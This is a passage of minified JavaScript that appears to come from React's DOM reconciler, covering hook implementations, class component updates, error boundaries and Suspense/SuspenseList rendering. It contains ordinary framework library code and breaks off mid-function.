s=i.events;s===null?i.events=[n]:s.push(n)}}function Vy(n){var i=Oa().memoizedState;return kP({ref:i,nextImpl:n}),function(){if((da&2)!==0)throw Error(o(440));return i.impl.apply(void 0,arguments)}}function Fy(n,i){return fd(4,2,n,i)}function Hy(n,i){return fd(4,4,n,i)}function Gy(n,i){if(typeof i=="function"){n=n();var s=i(n);return function(){typeof s=="function"?s():i(null)}}if(i!=null)return n=n(),i.current=n,function(){i.current=null}}function Jy(n,i,s){s=s!=null?s.concat([n]):null,fd(4,4,Gy.bind(null,i,n),s)}function hf(){}function Qy(n,i){var s=Oa();i=i===void 0?null:i;var u=s.memoizedState;return i!==null&&nf(i,u[1])?u[0]:(s.memoizedState=[n,i],n)}function Wy(n,i){var s=Oa();i=i===void 0?null:i;var u=s.memoizedState;if(i!==null&&nf(i,u[1]))return u[0];if(u=n(),Dr){qa(!0);try{n()}finally{qa(!1)}}return s.memoizedState=[u,i],u}function gf(n,i,s){return s===void 0||(Do&1073741824)!==0&&(We&261930)===0?n.memoizedState=i:(n.memoizedState=s,n=KE(),Ue.lanes|=n,ji|=n,s)}function Ky(n,i,s,u){return Ft(s,i)?s:js.current!==null?(n=gf(n,s,u),Ft(n,i)||(Qa=!0),n):(Do&42)===0||(Do&1073741824)!==0&&(We&261930)===0?(Qa=!0,n.memoizedState=s):(n=KE(),Ue.lanes|=n,ji|=n,i)}function $y(n,i,s,u,h){var b=pe.p;pe.p=b!==0&&8>b?b:8;var C=K.T,P={};K.T=P,yf(n,!1,i,s);try{var V=h(),X=K.S;if(X!==null&&X(P,V),V!==null&&typeof V=="object"&&typeof V.then=="function"){var ie=IP(V,u);ec(n,i,ie,Kt(n))}else ec(n,i,u,Kt(n))}catch(se){ec(n,i,{then:function(){},status:"rejected",reason:se},Kt())}finally{pe.p=b,C!==null&&P.types!==null&&(C.types=P.types),K.T=C}}function NP(){}function bf(n,i,s,u){if(n.tag!==5)throw Error(o(476));var h=Yy(n).queue;$y(n,h,i,ye,s===null?NP:function(){return Xy(n),s(u)})}function Yy(n){var i=n.memoizedState;if(i!==null)return i;i={memoizedState:ye,baseState:ye,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:wo,lastRenderedState:ye},next:null};var s={};return i.next={memoizedState:s,baseState:s,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:wo,lastRenderedState:s},next:null},n.memoizedState=i,n=n.alternate,n!==null&&(n.memoizedState=i),i}function Xy(n){var i=Yy(n);i.next===null&&(i=n.alternate.memoizedState),ec(n,i.next.queue,{},Kt())}function vf(){return lt(bc)}function Zy(){return Oa().memoizedState}function eE(){return Oa().memoizedState}function OP(n){for(var i=n.return;i!==null;){switch(i.tag){case 24:case 3:var s=Kt();n=Ei(s);var u=Si(i,n,s);u!==null&&(Mt(u,i,s),Kl(u,i,s)),i={cache:Jm()},n.payload=i;return}i=i.return}}function zP(n,i,s){var u=Kt();s={lane:u,revertLane:0,gesture:null,action:s,hasEagerState:!1,eagerState:null,next:null},hd(n)?tE(i,s):(s=_m(n,i,s,u),s!==null&&(Mt(s,n,u),nE(s,i,u)))}function aE(n,i,s){var u=Kt();ec(n,i,s,u)}function ec(n,i,s,u){var h={lane:u,revertLane:0,gesture:null,action:s,hasEagerState:!1,eagerState:null,next:null};if(hd(n))tE(i,h);else{var b=n.alternate;if(n.lanes===0&&(b===null||b.lanes===0)&&(b=i.lastRenderedReducer,b!==null))try{var C=i.lastRenderedState,P=b(C,s);if(h.hasEagerState=!0,h.eagerState=P,Ft(P,C))return Ku(n,i,h,0),Sa===null&&Wu(),!1}catch{}if(s=_m(n,i,h,u),s!==null)return Mt(s,n,u),nE(s,i,u),!0}return!1}function yf(n,i,s,u){if(u={lane:2,revertLane:Yf(),gesture:null,action:u,hasEagerState:!1,eagerState:null,next:null},hd(n)){if(i)throw Error(o(479))}else i=_m(n,s,u,2),i!==null&&Mt(i,n,2)}function hd(n){var i=n.alternate;return n===Ue||i!==null&&i===Ue}function tE(n,i){Ps=ld=!0;var s=n.pending;s===null?i.next=i:(i.next=s.next,s.next=i),n.pending=i}function nE(n,i,s){if((s&4194048)!==0){var u=i.lanes;u&=n.pendingLanes,s|=u,i.lanes=s,Cl(n,s)}}var ac={readContext:lt,use:dd,useCallback:Ma,useContext:Ma,useEffect:Ma,useImperativeHandle:Ma,useLayoutEffect:Ma,useInsertionEffect:Ma,useMemo:Ma,useReducer:Ma,useRef:Ma,useState:Ma,useDebugValue:Ma,useDeferredValue:Ma,useTransition:Ma,useSyncExternalStore:Ma,useId:Ma,useHostTransitionStatus:Ma,useFormState:Ma,useActionState:Ma,useOptimistic:Ma,useMemoCache:Ma,useCacheRefresh:Ma};ac.useEffectEvent=Ma;var oE={readContext:lt,use:dd,useCallback:function(n,i){return xt().memoizedState=[n,i===void 0?null:i],n},useContext:lt,useEffect:By,useImperativeHandle:function(n,i,s){s=s!=null?s.concat([n]):null,md(4194308,4,Gy.bind(null,i,n),s)},useLayoutEffect:function(n,i){return md(4194308,4,n,i)},useInsertionEffect:function(n,i){md(4,2,n,i)},useMemo:function(n,i){var s=xt();i=i===void 0?null:i;var u=n();if(Dr){qa(!0);try{n()}finally{qa(!1)}}return s.memoizedState=[u,i],u},useReducer:function(n,i,s){var u=xt();if(s!==void 0){var h=s(i);if(Dr){qa(!0);try{s(i)}finally{qa(!1)}}}else h=i;return u.memoizedState=u.baseState=h,n={pending:null,lanes:0,dispatch:null,lastRenderedReducer:n,lastRenderedState:h},u.queue=n,n=n.dispatch=zP.bind(null,Ue,n),[u.memoizedState,n]},useRef:function(n){var i=xt();return n={current:n},i.memoizedState=n},useState:function(n){n=pf(n);var i=n.queue,s=aE.bind(null,Ue,i);return i.dispatch=s,[n.memoizedState,s]},useDebugValue:hf,useDeferredValue:function(n,i){var s=xt();return gf(s,n,i)},useTransition:function(){var n=pf(!1);return n=$y.bind(null,Ue,n.queue,!0,!1),xt().memoizedState=n,[!1,n]},useSyncExternalStore:function(n,i,s){var u=Ue,h=xt();if(aa){if(s===void 0)throw Error(o(407));s=s()}else{if(s=i(),Sa===null)throw Error(o(349));(We&127)!==0||xy(u,i,s)}h.memoizedState=s;var b={value:s,getSnapshot:i};return h.queue=b,By(Py.bind(null,u,b,n),[n]),u.flags|=2048,Rs(9,{destroy:void 0},jy.bind(null,u,b,s,i),null),s},useId:function(){var n=xt(),i=Sa.identifierPrefix;if(aa){var s=co,u=lo;s=(u&~(1<<32-He(u)-1)).toString(32)+s,i="_"+i+"R_"+s,s=cd++,0<s&&(i+="H"+s.toString(32)),i+="_"}else s=DP++,i="_"+i+"r_"+s.toString(32)+"_";return n.memoizedState=i},useHostTransitionStatus:vf,useFormState:ky,useActionState:ky,useOptimistic:function(n){var i=xt();i.memoizedState=i.baseState=n;var s={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return i.queue=s,i=yf.bind(null,Ue,!0,s),s.dispatch=i,[n,i]},useMemoCache:cf,useCacheRefresh:function(){return xt().memoizedState=OP.bind(null,Ue)},useEffectEvent:function(n){var i=xt(),s={impl:n};return i.memoizedState=s,function(){if((da&2)!==0)throw Error(o(440));return s.impl.apply(void 0,arguments)}}},Ef={readContext:lt,use:dd,useCallback:Qy,useContext:lt,useEffect:ff,useImperativeHandle:Jy,useInsertionEffect:Fy,useLayoutEffect:Hy,useMemo:Wy,useReducer:pd,useRef:Uy,useState:function(){return pd(wo)},useDebugValue:hf,useDeferredValue:function(n,i){var s=Oa();return Ky(s,va.memoizedState,n,i)},useTransition:function(){var n=pd(wo)[0],i=Oa().memoizedState;return[typeof n=="boolean"?n:Zl(n),i]},useSyncExternalStore:Ty,useId:Zy,useHostTransitionStatus:vf,useFormState:Ny,useActionState:Ny,useOptimistic:function(n,i){var s=Oa();return Ly(s,va,n,i)},useMemoCache:cf,useCacheRefresh:eE};Ef.useEffectEvent=Vy;var iE={readContext:lt,use:dd,useCallback:Qy,useContext:lt,useEffect:ff,useImperativeHandle:Jy,useInsertionEffect:Fy,useLayoutEffect:Hy,useMemo:Wy,useReducer:df,useRef:Uy,useState:function(){return df(wo)},useDebugValue:hf,useDeferredValue:function(n,i){var s=Oa();return va===null?gf(s,n,i):Ky(s,va.memoizedState,n,i)},useTransition:function(){var n=df(wo)[0],i=Oa().memoizedState;return[typeof n=="boolean"?n:Zl(n),i]},useSyncExternalStore:Ty,useId:Zy,useHostTransitionStatus:vf,useFormState:zy,useActionState:zy,useOptimistic:function(n,i){var s=Oa();return va!==null?Ly(s,va,n,i):(s.baseState=n,[n,s.queue.dispatch])},useMemoCache:cf,useCacheRefresh:eE};iE.useEffectEvent=Vy;function Sf(n,i,s,u){i=n.memoizedState,s=s(u,i),s=s==null?i:y({},i,s),n.memoizedState=s,n.lanes===0&&(n.updateQueue.baseState=s)}var Cf={enqueueSetState:function(n,i,s){n=n._reactInternals;var u=Kt(),h=Ei(u);h.payload=i,s!=null&&(h.callback=s),i=Si(n,h,u),i!==null&&(Mt(i,n,u),Kl(i,n,u))},enqueueReplaceState:function(n,i,s){n=n._reactInternals;var u=Kt(),h=Ei(u);h.tag=1,h.payload=i,s!=null&&(h.callback=s),i=Si(n,h,u),i!==null&&(Mt(i,n,u),Kl(i,n,u))},enqueueForceUpdate:function(n,i){n=n._reactInternals;var s=Kt(),u=Ei(s);u.tag=2,i!=null&&(u.callback=i),i=Si(n,u,s),i!==null&&(Mt(i,n,s),Kl(i,n,s))}};function rE(n,i,s,u,h,b,C){return n=n.stateNode,typeof n.shouldComponentUpdate=="function"?n.shouldComponentUpdate(u,b,C):i.prototype&&i.prototype.isPureReactComponent?!Bl(s,u)||!Bl(h,b):!0}function sE(n,i,s,u){n=i.state,typeof i.componentWillReceiveProps=="function"&&i.componentWillReceiveProps(s,u),typeof i.UNSAFE_componentWillReceiveProps=="function"&&i.UNSAFE_componentWillReceiveProps(s,u),i.state!==n&&Cf.enqueueReplaceState(i,i.state,null)}function wr(n,i){var s=i;if("ref"in i){s={};for(var u in i)u!=="ref"&&(s[u]=i[u])}if(n=n.defaultProps){s===i&&(s=y({},s));for(var h in n)s[h]===void 0&&(s[h]=n[h])}return s}function lE(n){Qu(n)}function cE(n){console.error(n)}function uE(n){Qu(n)}function gd(n,i){try{var s=n.onUncaughtError;s(i.value,{componentStack:i.stack})}catch(u){setTimeout(function(){throw u})}}function dE(n,i,s){try{var u=n.onCaughtError;u(s.value,{componentStack:s.stack,errorBoundary:i.tag===1?i.stateNode:null})}catch(h){setTimeout(function(){throw h})}}function Af(n,i,s){return s=Ei(s),s.tag=3,s.payload={element:null},s.callback=function(){gd(n,i)},s}function pE(n){return n=Ei(n),n.tag=3,n}function mE(n,i,s,u){var h=s.type.getDerivedStateFromError;if(typeof h=="function"){var b=u.value;n.payload=function(){return h(b)},n.callback=function(){dE(i,s,u)}}var C=s.stateNode;C!==null&&typeof C.componentDidCatch=="function"&&(n.callback=function(){dE(i,s,u),typeof h!="function"&&(Pi===null?Pi=new Set([this]):Pi.add(this));var P=u.stack;this.componentDidCatch(u.value,{componentStack:P!==null?P:""})})}function UP(n,i,s,u,h){if(s.flags|=32768,u!==null&&typeof u=="object"&&typeof u.then=="function"){if(i=s.alternate,i!==null&&Ss(i,s,h,!0),s=Gt.current,s!==null){switch(s.tag){case 31:case 13:return fn===null?qd():s.alternate===null&&_a===0&&(_a=3),s.flags&=-257,s.flags|=65536,s.lanes=h,u===nd?s.flags|=16384:(i=s.updateQueue,i===null?s.updateQueue=new Set([u]):i.add(u),Wf(n,u,h)),!1;case 22:return s.flags|=65536,u===nd?s.flags|=16384:(i=s.updateQueue,i===null?(i={transitions:null,markerInstances:null,retryQueue:new Set([u])},s.updateQueue=i):(s=i.retryQueue,s===null?i.retryQueue=new Set([u]):s.add(u)),Wf(n,u,h)),!1}throw Error(o(435,s.tag))}return Wf(n,u,h),qd(),!1}if(aa)return i=Gt.current,i!==null?((i.flags&65536)===0&&(i.flags|=256),i.flags|=65536,i.lanes=h,u!==Bm&&(n=Error(o(422),{cause:u}),Hl(un(n,s)))):(u!==Bm&&(i=Error(o(423),{cause:u}),Hl(un(i,s))),n=n.current.alternate,n.flags|=65536,h&=-h,n.lanes|=h,u=un(u,s),h=Af(n.stateNode,u,h),Xm(n,h),_a!==4&&(_a=2)),!1;var b=Error(o(520),{cause:u});if(b=un(b,s),cc===null?cc=[b]:cc.push(b),_a!==4&&(_a=2),i===null)return!0;u=un(u,s),s=i;do{switch(s.tag){case 3:return s.flags|=65536,n=h&-h,s.lanes|=n,n=Af(s.stateNode,u,n),Xm(s,n),!1;case 1:if(i=s.type,b=s.stateNode,(s.flags&128)===0&&(typeof i.getDerivedStateFromError=="function"||b!==null&&typeof b.componentDidCatch=="function"&&(Pi===null||!Pi.has(b))))return s.flags|=65536,h&=-h,s.lanes|=h,h=pE(h),mE(h,n,s,u),Xm(s,h),!1}s=s.return}while(s!==null);return!1}var Tf=Error(o(461)),Qa=!1;function ct(n,i,s,u){i.child=n===null?by(i,null,s,u):Ir(i,n.child,s,u)}function fE(n,i,s,u,h){s=s.render;var b=i.ref;if("ref"in u){var C={};for(var P in u)P!=="ref"&&(C[P]=u[P])}else C=u;return Pr(i),u=of(n,i,s,C,b,h),P=rf(),n!==null&&!Qa?(sf(n,i,h),Mo(n,i,h)):(aa&&P&&zm(i),i.flags|=1,ct(n,i,u,h),i.child)}function hE(n,i,s,u,h){if(n===null){var b=s.type;return typeof b=="function"&&!km(b)&&b.defaultProps===void 0&&s.compare===null?(i.tag=15,i.type=b,gE(n,i,b,u,h)):(n=Yu(s.type,null,u,i,i.mode,h),n.ref=i.ref,n.return=i,i.child=n)}if(b=n.child,!Df(n,h)){var C=b.memoizedProps;if(s=s.compare,s=s!==null?s:Bl,s(C,u)&&n.ref===i.ref)return Mo(n,i,h)}return i.flags|=1,n=qo(b,u),n.ref=i.ref,n.return=i,i.child=n}function gE(n,i,s,u,h){if(n!==null){var b=n.memoizedProps;if(Bl(b,u)&&n.ref===i.ref)if(Qa=!1,i.pendingProps=u=b,Df(n,h))(n.flags&131072)!==0&&(Qa=!0);else return i.lanes=n.lanes,Mo(n,i,h)}return xf(n,i,s,u,h)}function bE(n,i,s,u){var h=u.children,b=n!==null?n.memoizedState:null;if(n===null&&i.stateNode===null&&(i.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),u.mode==="hidden"){if((i.flags&128)!==0){if(b=b!==null?b.baseLanes|s:s,n!==null){for(u=i.child=n.child,h=0;u!==null;)h=h|u.lanes|u.childLanes,u=u.sibling;u=h&~b}else u=0,i.child=null;return vE(n,i,b,s,u)}if((s&536870912)!==0)i.memoizedState={baseLanes:0,cachePool:null},n!==null&&ad(i,b!==null?b.cachePool:null),b!==null?Ey(i,b):ef(),Sy(i);else return u=i.lanes=536870912,vE(n,i,b!==null?b.baseLanes|s:s,s,u)}else b!==null?(ad(i,b.cachePool),Ey(i,b),Ai(),i.memoizedState=null):(n!==null&&ad(i,null),ef(),Ai());return ct(n,i,h,s),i.child}function tc(n,i){return n!==null&&n.tag===22||i.stateNode!==null||(i.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),i.sibling}function vE(n,i,s,u,h){var b=Wm();return b=b===null?null:{parent:Ga._currentValue,pool:b},i.memoizedState={baseLanes:s,cachePool:b},n!==null&&ad(i,null),ef(),Sy(i),n!==null&&Ss(n,i,u,!0),i.childLanes=h,null}function bd(n,i){return i=yd({mode:i.mode,children:i.children},n.mode),i.ref=n.ref,n.child=i,i.return=n,i}function yE(n,i,s){return Ir(i,n.child,null,s),n=bd(i,i.pendingProps),n.flags|=2,Jt(i),i.memoizedState=null,n}function BP(n,i,s){var u=i.pendingProps,h=(i.flags&128)!==0;if(i.flags&=-129,n===null){if(aa){if(u.mode==="hidden")return n=bd(i,u),i.lanes=536870912,tc(null,n);if(tf(i),(n=xa)?(n=IS(n,mn),n=n!==null&&n.data==="&"?n:null,n!==null&&(i.memoizedState={dehydrated:n,treeContext:hi!==null?{id:lo,overflow:co}:null,retryLane:536870912,hydrationErrors:null},s=ty(n),s.return=i,i.child=s,st=i,xa=null)):n=null,n===null)throw bi(i);return i.lanes=536870912,null}return bd(i,u)}var b=n.memoizedState;if(b!==null){var C=b.dehydrated;if(tf(i),h)if(i.flags&256)i.flags&=-257,i=yE(n,i,s);else if(i.memoizedState!==null)i.child=n.child,i.flags|=128,i=null;else throw Error(o(558));else if(Qa||Ss(n,i,s,!1),h=(s&n.childLanes)!==0,Qa||h){if(u=Sa,u!==null&&(C=Al(u,s),C!==0&&C!==b.retryLane))throw b.retryLane=C,Ar(n,C),Mt(u,n,C),Tf;qd(),i=yE(n,i,s)}else n=b.treeContext,xa=hn(C.nextSibling),st=i,aa=!0,gi=null,mn=!1,n!==null&&iy(i,n),i=bd(i,u),i.flags|=4096;return i}return n=qo(n.child,{mode:u.mode,children:u.children}),n.ref=i.ref,i.child=n,n.return=i,n}function vd(n,i){var s=i.ref;if(s===null)n!==null&&n.ref!==null&&(i.flags|=4194816);else{if(typeof s!="function"&&typeof s!="object")throw Error(o(284));(n===null||n.ref!==s)&&(i.flags|=4194816)}}function xf(n,i,s,u,h){return Pr(i),s=of(n,i,s,u,void 0,h),u=rf(),n!==null&&!Qa?(sf(n,i,h),Mo(n,i,h)):(aa&&u&&zm(i),i.flags|=1,ct(n,i,s,h),i.child)}function EE(n,i,s,u,h,b){return Pr(i),i.updateQueue=null,s=Ay(i,u,s,h),Cy(n),u=rf(),n!==null&&!Qa?(sf(n,i,b),Mo(n,i,b)):(aa&&u&&zm(i),i.flags|=1,ct(n,i,s,b),i.child)}function SE(n,i,s,u,h){if(Pr(i),i.stateNode===null){var b=bs,C=s.contextType;typeof C=="object"&&C!==null&&(b=lt(C)),b=new s(u,b),i.memoizedState=b.state!==null&&b.state!==void 0?b.state:null,b.updater=Cf,i.stateNode=b,b._reactInternals=i,b=i.stateNode,b.props=u,b.state=i.memoizedState,b.refs={},$m(i),C=s.contextType,b.context=typeof C=="object"&&C!==null?lt(C):bs,b.state=i.memoizedState,C=s.getDerivedStateFromProps,typeof C=="function"&&(Sf(i,s,C,u),b.state=i.memoizedState),typeof s.getDerivedStateFromProps=="function"||typeof b.getSnapshotBeforeUpdate=="function"||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(C=b.state,typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount(),C!==b.state&&Cf.enqueueReplaceState(b,b.state,null),Yl(i,u,b,h),$l(),b.state=i.memoizedState),typeof b.componentDidMount=="function"&&(i.flags|=4194308),u=!0}else if(n===null){b=i.stateNode;var P=i.memoizedProps,V=wr(s,P);b.props=V;var X=b.context,ie=s.contextType;C=bs,typeof ie=="object"&&ie!==null&&(C=lt(ie));var se=s.getDerivedStateFromProps;ie=typeof se=="function"||typeof b.getSnapshotBeforeUpdate=="function",P=i.pendingProps!==P,ie||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(P||X!==C)&&sE(i,b,u,C),yi=!1;var ae=i.memoizedState;b.state=ae,Yl(i,u,b,h),$l(),X=i.memoizedState,P||ae!==X||yi?(typeof se=="function"&&(Sf(i,s,se,u),X=i.memoizedState),(V=yi||rE(i,s,V,u,ae,X,C))?(ie||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount()),typeof b.componentDidMount=="function"&&(i.flags|=4194308)):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),i.memoizedProps=u,i.memoizedState=X),b.props=u,b.state=X,b.context=C,u=V):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),u=!1)}else{b=i.stateNode,Ym(n,i),C=i.memoizedProps,ie=wr(s,C),b.props=ie,se=i.pendingProps,ae=b.context,X=s.contextType,V=bs,typeof X=="object"&&X!==null&&(V=lt(X)),P=s.getDerivedStateFromProps,(X=typeof P=="function"||typeof b.getSnapshotBeforeUpdate=="function")||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(C!==se||ae!==V)&&sE(i,b,u,V),yi=!1,ae=i.memoizedState,b.state=ae,Yl(i,u,b,h),$l();var ne=i.memoizedState;C!==se||ae!==ne||yi||n!==null&&n.dependencies!==null&&Zu(n.dependencies)?(typeof P=="function"&&(Sf(i,s,P,u),ne=i.memoizedState),(ie=yi||rE(i,s,ie,u,ae,ne,V)||n!==null&&n.dependencies!==null&&Zu(n.dependencies))?(X||typeof b.UNSAFE_componentWillUpdate!="function"&&typeof b.componentWillUpdate!="function"||(typeof b.componentWillUpdate=="function"&&b.componentWillUpdate(u,ne,V),typeof b.UNSAFE_componentWillUpdate=="function"&&b.UNSAFE_componentWillUpdate(u,ne,V)),typeof b.componentDidUpdate=="function"&&(i.flags|=4),typeof b.getSnapshotBeforeUpdate=="function"&&(i.flags|=1024)):(typeof b.componentDidUpdate!="function"||C===n.memoizedProps&&ae===n.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||C===n.memoizedProps&&ae===n.memoizedState||(i.flags|=1024),i.memoizedProps=u,i.memoizedState=ne),b.props=u,b.state=ne,b.context=V,u=ie):(typeof b.componentDidUpdate!="function"||C===n.memoizedProps&&ae===n.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||C===n.memoizedProps&&ae===n.memoizedState||(i.flags|=1024),u=!1)}return b=u,vd(n,i),u=(i.flags&128)!==0,b||u?(b=i.stateNode,s=u&&typeof s.getDerivedStateFromError!="function"?null:b.render(),i.flags|=1,n!==null&&u?(i.child=Ir(i,n.child,null,h),i.child=Ir(i,null,s,h)):ct(n,i,s,h),i.memoizedState=b.state,n=i.child):n=Mo(n,i,h),n}function CE(n,i,s,u){return xr(),i.flags|=256,ct(n,i,s,u),i.child}var jf={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Pf(n){return{baseLanes:n,cachePool:dy()}}function qf(n,i,s){return n=n!==null?n.childLanes&~s:0,i&&(n|=Wt),n}function AE(n,i,s){var u=i.pendingProps,h=!1,b=(i.flags&128)!==0,C;if((C=b)||(C=n!==null&&n.memoizedState===null?!1:(Na.current&2)!==0),C&&(h=!0,i.flags&=-129),C=(i.flags&32)!==0,i.flags&=-33,n===null){if(aa){if(h?Ci(i):Ai(),(n=xa)?(n=IS(n,mn),n=n!==null&&n.data!=="&"?n:null,n!==null&&(i.memoizedState={dehydrated:n,treeContext:hi!==null?{id:lo,overflow:co}:null,retryLane:536870912,hydrationErrors:null},s=ty(n),s.return=i,i.child=s,st=i,xa=null)):n=null,n===null)throw bi(i);return uh(n)?i.lanes=32:i.lanes=536870912,null}var P=u.children;return u=u.fallback,h?(Ai(),h=i.mode,P=yd({mode:"hidden",children:P},h),u=Tr(u,h,s,null),P.return=i,u.return=i,P.sibling=u,i.child=P,u=i.child,u.memoizedState=Pf(s),u.childLanes=qf(n,C,s),i.memoizedState=jf,tc(null,u)):(Ci(i),Rf(i,P))}var V=n.memoizedState;if(V!==null&&(P=V.dehydrated,P!==null)){if(b)i.flags&256?(Ci(i),i.flags&=-257,i=Lf(n,i,s)):i.memoizedState!==null?(Ai(),i.child=n.child,i.flags|=128,i=null):(Ai(),P=u.fallback,h=i.mode,u=yd({mode:"visible",children:u.children},h),P=Tr(P,h,s,null),P.flags|=2,u.return=i,P.return=i,u.sibling=P,i.child=u,Ir(i,n.child,null,s),u=i.child,u.memoizedState=Pf(s),u.childLanes=qf(n,C,s),i.memoizedState=jf,i=tc(null,u));else if(Ci(i),uh(P)){if(C=P.nextSibling&&P.nextSibling.dataset,C)var X=C.dgst;C=X,u=Error(o(419)),u.stack="",u.digest=C,Hl({value:u,source:null,stack:null}),i=Lf(n,i,s)}else if(Qa||Ss(n,i,s,!1),C=(s&n.childLanes)!==0,Qa||C){if(C=Sa,C!==null&&(u=Al(C,s),u!==0&&u!==V.retryLane))throw V.retryLane=u,Ar(n,u),Mt(C,n,u),Tf;ch(P)||qd(),i=Lf(n,i,s)}else ch(P)?(i.flags|=192,i.child=n.child,i=null):(n=V.treeContext,xa=hn(P.nextSibling),st=i,aa=!0,gi=null,mn=!1,n!==null&&iy(i,n),i=Rf(i,u.children),i.flags|=4096);return i}return h?(Ai(),P=u.fallback,h=i.mode,V=n.child,X=V.sibling,u=qo(V,{mode:"hidden",children:u.children}),u.subtreeFlags=V.subtreeFlags&65011712,X!==null?P=qo(X,P):(P=Tr(P,h,s,null),P.flags|=2),P.return=i,u.return=i,u.sibling=P,i.child=u,tc(null,u),u=i.child,P=n.child.memoizedState,P===null?P=Pf(s):(h=P.cachePool,h!==null?(V=Ga._currentValue,h=h.parent!==V?{parent:V,pool:V}:h):h=dy(),P={baseLanes:P.baseLanes|s,cachePool:h}),u.memoizedState=P,u.childLanes=qf(n,C,s),i.memoizedState=jf,tc(n.child,u)):(Ci(i),s=n.child,n=s.sibling,s=qo(s,{mode:"visible",children:u.children}),s.return=i,s.sibling=null,n!==null&&(C=i.deletions,C===null?(i.deletions=[n],i.flags|=16):C.push(n)),i.child=s,i.memoizedState=null,s)}function Rf(n,i){return i=yd({mode:"visible",children:i},n.mode),i.return=n,n.child=i}function yd(n,i){return n=Ht(22,n,null,i),n.lanes=0,n}function Lf(n,i,s){return Ir(i,n.child,null,s),n=Rf(i,i.pendingProps.children),n.flags|=2,i.memoizedState=null,n}function TE(n,i,s){n.lanes|=i;var u=n.alternate;u!==null&&(u.lanes|=i),Hm(n.return,i,s)}function If(n,i,s,u,h,b){var C=n.memoizedState;C===null?n.memoizedState={isBackwards:i,rendering:null,renderingStartTime:0,last:u,tail:s,tailMode:h,treeForkCount:b}:(C.isBackwards=i,C.rendering=null,C.renderingStartTime=0,C.last=u,C.tail=s,C.tailMode=h,C.treeForkCount=b)}function xE(n,i,s){var u=i.pendingProps,h=u.revealOrder,b=u.tail;u=u.children;var C=Na.current,P=(C&2)!==0;if(P?(C=C&1|2,i.flags|=128):C&=1,M(Na,C),ct(n,i,u,s),u=aa?Fl:0,!P&&n!==null&&(n.flags&128)!==0)e:for(n=i.child;n!==null;){if(n.tag===13)n.memoizedState!==null&&TE(n,s,i);else if(n.tag===19)TE(n,s,i);else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===i)break e;for(;n.sibling===null;){if(n.return===null||n.return===i)break e;n=n.return}n.sibling.return=n.return,n=n.sibling}switch(h){case"forwards":for(s=i.child,h=null;s!==null;)n=s.alternate,n!==null&&sd(n)===null&&(h=s),s=s.sibling;s=h,s===null?(h=i.child,i.child=null):(h=s.sibling,s.sibling=null),If(i,!1,h,s,b,u);break;case"backwards":case"unstable_legacy-backwards":for(s=null,h=i.child,i.child=null;h!==null;){if(n=h.alternate,n!==null&&sd(n)===null){i.child=h;break}n=h.sibling,h.sibling=s,s=h,h=n}If(i,!0,s,null,b,u);break;case"together":If(i,!1,null,null,void 0,u);break;default:i.memoizedState=null}return i.child}function Mo(n,i,s){if(n!==null&&(i.dependencies=n.dependencies),ji|=i.lanes,(s&i.childLanes)===0)if(n!==null){if(Ss(n,i,s,!1),(s&i.childLanes)===0)return null}else return null;if(n!==null&&i.child!==n.child)throw Error(o(153));if(i.child!==null){for(n=i.child,s=qo(n,n.pendingProps),i.child=s,s.return=i;n.sibling!==null;)n=n.sibling,s=s.sibling=qo(n,n.pendingProps),s.return=i;s.sibling=null}return i.child}function Df(n,i){return(n.lanes&i)!==0?!0:(n=n.dependencies,!!(n!==null&&Zu(n)))}function VP(n,i,s){switch(i.tag){case 3:sa(i,i.stateNode.containerInfo),vi(i,Ga,n.memoizedState.cache),xr();break;case 27:case 5:Pe(i);break;case 4:sa(i,i.stateNode.containerInfo);break;case 10:vi(i,i.type,i.memoizedProps.value);break;case 31:if(i.memoizedState!==null)return i.flags|=128,tf(i),null;break;case 13:var u=i.memoizedState;if(u!==null)return u.dehydrated!==null?(Ci(i),i.flags|=128,null):(s&i.child.childLanes)!==0?AE(n,i,s):(Ci(i),n=Mo(n,i,s),n!==null?n.sibling:null);Ci(i);break;case 19:var h=(n.flags&128)!==0;if(u=(s&i.childLanes)!==0,u||(Ss(n,i,s,!1),u=(s&i.childLanes)!==0),h){if(u)return xE(n,i,s);i.flags|=128}if(h=i.memoizedState,h!==null&&(h.rendering=null,h.tail=null,h.lastEffect=null),M(Na,Na.current),u)break;return null;case 22:return i.lanes=0,bE(n,i,s,i.pendingProps);case 24:vi(i,Ga,n.memoizedState.cache)}return Mo(n,i,s)}function jE(n,i,s){if(n!==null)if(n.memoizedProps!==i.pendingProps)Qa=!0;else{if(!Df(n,s)&&(i.flags&128)===0)return Qa=!1,VP(n,i,s);Qa=(n.flags&131072)!==0}else Qa=!1,aa&&(i.flags&1048576)!==0&&oy(i,Fl,i.index);switch(i.lanes=0,i.tag){case 16:e:{var u=i.pendingProps;if(n=Rr(i.elementType),i.type=n,typeof n=="function")km(n)?(u=wr(n,u),i.tag=1,i=SE(null,i,n,u,s)):(i.tag=0,i=xf(null,i,n,u,s));else{if(n!=null){var h=n.$$typeof;if(h===ee){i.tag=11,i=fE(null,i,n,u,s);break e}else if(h===w){i.tag=14,i=hE(null,i,n,u,s);break e}}throw i=ge(n)||n,Error(o(306,i,""))}}return i;case 0:return xf(n,i,i.type,i.pendingProps,s);case 1:return u=i.type,h=wr(u,i.pendingProps),SE(n,i,u,h,s);case 3:e:{if(sa(i,i.stateNode.containerInfo),n===null)throw 